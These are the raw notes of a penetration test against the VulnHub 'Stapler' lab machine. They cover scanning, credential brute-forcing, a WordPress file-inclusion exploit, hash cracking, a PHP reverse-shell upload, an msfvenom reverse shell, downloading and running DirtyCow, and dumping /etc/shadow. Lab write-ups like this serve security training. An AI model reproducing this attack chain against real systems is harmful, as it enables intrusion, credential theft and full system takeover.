Stapler
https://download.vulnhub.com/stapler/Stapler.zip

firewall up and block ping

root@kali:~/Desktop# bash ./detailPortScan.sh 10.0.1.3
working on 10.0.1.3...
will be a while so relax ^^

unicornscan 10.0.1.3:1-65535
TCP: 21,22,53,80,139,666,3306,12380

nmap 10.0.1.3 -A -p 21,22,53,80,139,666,3306,12380

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-11 20:39 EDT
Nmap scan report for 10.0.1.3
Host is up (0.00042s latency).
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: Can't parse PASV response: "Permission denied."
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
53/tcp    open  domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  doom?
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: LongPassword, Speaks41ProtocolOld, ODBCClient, Support41Auth, SupportsTransactions, SupportsCompression, LongColumnFlag, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 1l\x185\x1D1\x06e\x19\x0Cr]\x06ya\x12+GEF\x00
|_  Auth Plugin Name: 88
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.25BETA2%I=7%D=4/11%Time=58ED775F%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x
SF:20533\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</
SF:title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20
SF:#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x20
SF:1\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20
SF:min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x
SF:20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;
SF:\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:m
SF:onospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Foun
SF:d</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code
SF:>\x20was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%
SF:r(HTTPOptions,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20c
SF:lose\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:
SF:\x20533\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found
SF:</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x
SF:20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x
SF:201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x
SF:20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset
SF:\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010p
SF:x;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family
SF::monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Fo
SF:und</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</co
SF:de>\x20was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>"
SF:)%r(FourOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnecti
SF:on:\x20close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent
SF:-Length:\x20568\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\
SF:x20Found</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20
SF:color:\x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font
SF:-size:\x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9
SF:999cc;\x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\
SF:x20inset\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left
SF::\x2010px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20fon
SF:t-family:monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>N
SF:ot\x20Found</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url
SF:\">/nice%20ports%2C/Tri%6Eity\.txt%2ebak</code>\x20was\x20not\x20found\
SF:x20on\x20this\x20server\.</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port666-TCP:V=7.25BETA2%I=7%D=4/11%Time=58ED7759%P=x86_64-pc-linux-gnu%
SF:r(NULL,2800,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0
SF:\0\x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x
SF:01\x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88
SF:A@\xa2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E
SF:\xa2\x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\
SF:x0f\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7
SF:\xaeu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x
SF:99\xd3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\x
SF:f8\xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xc
SF:e\[\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\
SF:x8b\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\
SF:xe0\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\x
SF:e4\xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\x
SF:f1\xaf\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1
SF:\xe2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\
SF:x1bk\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9
SF:\xcc\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1
SF:c\xfd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3
SF:\xcc\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|
SF:\xb0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\
SF:(\[r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5
SF:\xaak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\
SF:x7fy\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7
SF:f\x7f\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82
SF:\xcb\[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\
SF:xf9\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x
SF:8f\xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f
SF:\x81\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0
SF:bI\x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xca
SF:p\x8f\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb
SF:&\xf4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC
SF:\xcd\x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\x
SF:bc\xbcL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf
SF:5\xf0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15
SF:\x04\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6
SF:GTQ\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P
SF:\x11\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:1B:BA:1A (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.1, Linux 3.16 - 3.19, Linux 3.2 - 4.4, Linux 4.4
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -10h00m05s, deviation: 0s, median: -10h00m05s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED
|   Domain name: 
|   FQDN: red
|_  System time: 2017-04-11T15:40:09+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 10.0.1.3

Post-scan script results:
| clock-skew: 
|_  -10h00m05s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.02 seconds

unicornscan -mU 10.0.1.3:1-65535
UDP: 53,137,56862

nmap 10.0.1.3 -sU -A -p 53,137,56862

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-11 20:44 EDT
Nmap scan report for 10.0.1.3
Host is up (0.00047s latency).
PORT      STATE  SERVICE    VERSION
53/udp    open   domain     dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
137/udp   open   netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
56862/udp closed unknown
MAC Address: 08:00:27:1B:BA:1A (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: RED

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 10.0.1.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds

vsftp allow anonymous login
root@kali:~/Desktop# ftp 10.0.1.3
Connected to 10.0.1.3.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (10.0.1.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get note note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (181.0956 kB/s)
ftp> bye
221 Goodbye.

From note, found 2 users elly and john
root@kali:~/Desktop/loot# cat note 
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

nikto says found .bashrc and .profile
root@kali:~/Desktop# curl http://10.0.1.3/.bashrc
root@kali:~/Desktop# curl http://10.0.1.3/.profile

dordotpwn found no dir traversal on both ftp or http

found nothing on whatweb

root@kali:~/Desktop# gobuster -u http://10.0.1.3 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x php,html,txt,jsp
 found nothing

port 666 seems to be serving a zip jpg file
root@kali:~/Desktop# nc -vn 10.0.1.3 666 > ./message2.zip
(UNKNOWN) [10.0.1.3] 666 (?) open
root@kali:~/Desktop# unzip ./message2.zip
Archive:  ./message2.zip
  inflating: message2.jpg

jpg file shows a message 
$ echo hello world
hello world
$ echo scott please change this message
segmentation fault

root@kali:~/Desktop# strings ./message2.jpg
If you are reading this, you should get a cookie!

root@kali:~/Desktop# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.1.3 mysql -f
no luck

http://10.0.1.3:12380/
seems to be serving http

root@kali:~/Desktop# nikto -h http://10.0.1.3:12380
+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.********using SSL so https://
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
/admin112233/' 
'/blogblog/' 
robots.txt
 /icons/README
/phpmyadmin/

https://10.0.1.3:12380/admin112233/
seems to be a dummy

root@kali:~/Desktop# curl https://10.0.1.3:12380/admin112233/index.html | html2text
Give yourself a cookie! Javascript didn't run =)


https://10.0.1.3:12380/blogblog/
is wordpress

root@kali:~/Desktop/loot# wpscan --url https://10.0.1.3:12380/blogblog/ -e

[+] Enumerating usernames ...
[+] Identified the following 10 user/s:
    +----+---------+-----------------+
    | Id | Login   | Name            |
    +----+---------+-----------------+
    | 1  | john    | John Smith      |
    | 2  | elly    | Elly Jones      |
    | 3  | peter   | Peter Parker    |
    | 4  | barry   | Barry Atkins    |
    | 5  | heather | Heather Neville |
    | 6  | garry   | garry           |
    | 7  | harry   | harry           |
    | 8  | scott   | scott           |
    | 9  | kathy   | kathy           |
    | 10 | tim     | tim             |
    +----+---------+-----------------+

elly's word press site says john runs this place (admin??)


root@kali:~/Desktop# cewl https://10.0.1.3:12380/blogblog/wp-login.php -m 6 > wp.pass
root@kali:~/Desktop# wpscan --url https://10.0.1.3:12380/blogblog/ --usernames /root/Desktop/wp.user -w /root/Desktop/wp.lst 
+----+----------+------+----------+
  | Id | Login    | Name | Password |
  +----+----------+------+----------+
  |    | john     |      |          |
  |    | elly     |      |          |
  |    | peter    |      |          |
  |    | barry    |      |          |
  |    | heather  |      |          |
  |    | garry    |      | football |
  |    | harry    |      |          |
  |    | scott    |      |          |
  |    | kathy    |      |          |
  |    | tim      |      |          |
  +----+----------+------+----------+


root@kali:~/Desktop# gobuster -u https://10.0.1.3:12380 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,asp,txt -e

https://10.0.1.3:12380/announcements
Abby, we need to link the folder somewhere! Hidden at the mo

root@kali:~/Desktop# hydra -L ./users.stapler 10.0.1.3 ssh -t4 -e nsr
root@kali:~/Desktop# hydra -L ./users.stapler 10.0.1.3 ftp -e nrs
no luck

reviewing all info, note mentioned
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.

so elly must have a real ftp account

root@kali:~/Desktop# hydra -l elly 10.0.1.3 ftp -e nrs
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-11 22:16:21
[DATA] max 3 tasks per 1 server, overall 64 tasks, 3 login tries (l:1/p:3), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 10.0.1.3   login: elly   password: ylle
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-11 22:16:25

root@kali:~/Desktop# ftp 10.0.1.3
elly:ylle seems to have /etc/ as root dir

check /etc/phpmyadmin
can not read config-db.php

ftp> get passwd passwd.stapler
local: passwd.stapler remote: passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for passwd (2908 bytes).
226 Transfer complete.
2908 bytes received in 0.00 secs (8.5860 MB/s)

root@kali:~/Desktop# cat passwd.stapler | grep -vP '(nologin)|(false)'
root:x:0:0:root:/root:/bin/zsh
sync:x:4:65534:sync:/bin:/bin/sync
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
AParnell:x:1004:1004::/home/AParnell:/bin/bash
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
JBare:x:1007:1007::/home/JBare:/bin/bash
LSolum:x:1008:1008::/home/LSolum:/bin/bash
MFrei:x:1010:1010::/home/MFrei:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
JLipps:x:1017:1017::/home/JLipps:/bin/sh
jamie:x:1018:1018::/home/jamie:/bin/sh
Sam:x:1019:1019::/home/Sam:/bin/zsh
Drew:x:1020:1020::/home/Drew:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
Taylor:x:1023:1023::/home/Taylor:/bin/sh
mel:x:1024:1024::/home/mel:/bin/bash
kai:x:1025:1025::/home/kai:/bin/sh
zoe:x:1026:1026::/home/zoe:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
www:x:1028:1028::/home/www:
elly:x:1029:1029::/home/elly:/bin/bash

ftp> get samba/smb.conf smb.conf
local: smb.conf remote: samba/smb.conf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for samba/smb.conf (9897 bytes).
226 Transfer complete.
9897 bytes received in 0.00 secs (19.0677 MB/s)

root@kali:~/Desktop# cat smb.conf 
shows kathy and temp share writable

checked mysql
no luck

ftp> get lsb-release lsb-release
local: lsb-release remote: lsb-release
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lsb-release (103 bytes).
226 Transfer complete.
103 bytes received in 0.00 secs (178.0282 kB/s)

root@kali:~/Desktop# cat lsb-release 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04******calls for dirtyCow************
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"

root@kali:~/Desktop# wpscan --url https://10.0.1.3:12380/blogblog/ -e ap
[+] We found 4 plugins:
[+] Name: advanced-video-embed-embed-videos-or-playlists - v1.0
[+] Name: akismet
[+] Name: shortcode-ui - v0.6.2
[+] Name: two-factor
 
or just look in it' folder if /wp-content/plugins/ is accessible
root@kali:~/Desktop# curl https://10.0.1.3:12380/blogblog/wp-content/plugins/ -k | html2text 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1683  100  1683    0     0  11406      0 --:--:-- --:--:-- --:--:-- 11448
****** Index of /blogblog/wp-content/plugins ******
[[ICO]]       Name                        Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                               -  
[[DIR]]       advanced-video-embed-embed- 2015-10-14 13:52    -  
              videos-or-playlists/
[[   ]]       hello.php                   2016-06-03 23:40 2.2K  
[[DIR]]       shortcode-ui/               2015-11-12 17:07    -  
[[DIR]]       two-factor/                 2016-04-12 22:56    -  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.0.1.3 Port 12380


root@kali:/usr/share/exploitdb/platforms# searchsploit advanced video
WordPress Plugin Advanced Video 1.0 - Local File Inclusion  | ./php/webapps/39646.py

edit
url = "https://10.0.1.3:12380/blogblog/" # insert url to wordpress

root@kali:/usr/share/exploitdb/platforms# export PYTHONHTTPSVERIFY=0
root@kali:/usr/share/exploitdb/platforms# python ./php/webapps/39646.py

exploit will grab wp-config.php and upload it as a .jpg file in 
https://10.0.1.3:12380/blogblog/wp-content/uploads/

access content with
root@kali:~/Desktop# curl https://10.0.1.3:12380/blogblog/wp-content/uploads/711512596.jpeg -k
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

root@kali:~/Desktop# mysql -h 10.0.1.3 -u root -pplbkac
Warning: Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1186
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(64)         | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   |     |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(60)         | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.00 sec)

root@kali:~/Desktop/loot# john wp.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
incorrect        (John)

lets get a shell already
login to wordpress with admin (john:incorrect)
https://10.0.1.3:12380/blogblog/wp-admin/

It seems the usual modify of dolly plugin to get a shell don't work b/c www-data have no write permission on anything in 
webRoot except /var/www/https/blogblog/wp-content/uploads (I found this out after rooted the box)
but just the click of plugin upload will put the file into (no need to activate ^^)
https://10.0.1.3:12380/blogblog/wp-content/uploads/
and heres where the php backdoor can be executed
https://10.0.1.3:12380/blogblog/wp-content/uploads/wp-plugin-rev-443.php

donr forget to make a 32 bit reverse shell
root@kali:~/Desktop# msfvenom -p linux/x86/shell_reverse_tcp LPORT=443 LHOST=10.0.1.2 -f elf >/var/www/html/rev-443

privilege escalation
root@kali:~/Desktop# nc -lnvp 443
listening on [any] 443 ...
connect to [10.0.1.2] from (UNKNOWN) [10.0.1.3] 50712
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cd /tmp
cd /tmp
www-data@red:/tmp$ wget http://10.0.1.2/dirtyCow
wget http://10.0.1.2/dirtyCow
--2017-04-12 15:12:48--  http://10.0.1.2/dirtyCow
Connecting to 10.0.1.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11344 (11K)
Saving to: 'dirtyCow'

dirtyCow            100%[===================>]  11.08K  --.-KB/s    in 0s      

2017-04-12 15:12:48 (205 MB/s) - 'dirtyCow' saved [11344/11344]

www-data@red:/tmp$ chmod +x ./dirtyCow
chmod +x ./dirtyCow
www-data@red:/tmp$ ./dirtyCow
./dirtyCow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 53128
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@red:/tmp# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@red:/tmp# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@red:/tmp# cat /etc/shadow
cat /etc/shadow
root:$6$TdNg38a/$z0y9QQigTQ2FeW02XFwGaHkF/X.qPK3BqX9zLhqu.6ffpzy0OLp2TUm9ywx99LqIIjVBPPIxqOtTQbLBXR9JT1:16957:0:99999:7:::
daemon:*:16911:0:99999:7:::
bin:*:16911:0:99999:7:::
sys:*:16911:0:99999:7:::
sync:*:16911:0:99999:7:::
games:*:16911:0:99999:7:::
man:*:16911:0:99999:7:::
lp:*:16911:0:99999:7:::
mail:*:16911:0:99999:7:::
news:*:16911:0:99999:7:::
uucp:*:16911:0:99999:7:::
proxy:*:16911:0:99999:7:::
www-data:*:16911:0:99999:7:::
backup:*:16911:0:99999:7:::
list:*:16911:0:99999:7:::
irc:*:16911:0:99999:7:::
gnats:*:16911:0:99999:7:::
nobody:*:16911:0:99999:7:::
systemd-timesync:*:16911:0:99999:7:::
systemd-network:*:16911:0:99999:7:::
systemd-resolve:*:16911:0:99999:7:::
systemd-bus-proxy:*:16911:0:99999:7:::
syslog:*:16911:0:99999:7:::
_apt:*:16911:0:99999:7:::
lxd:*:16955:0:99999:7:::
dnsmasq:*:16955:0:99999:7:::
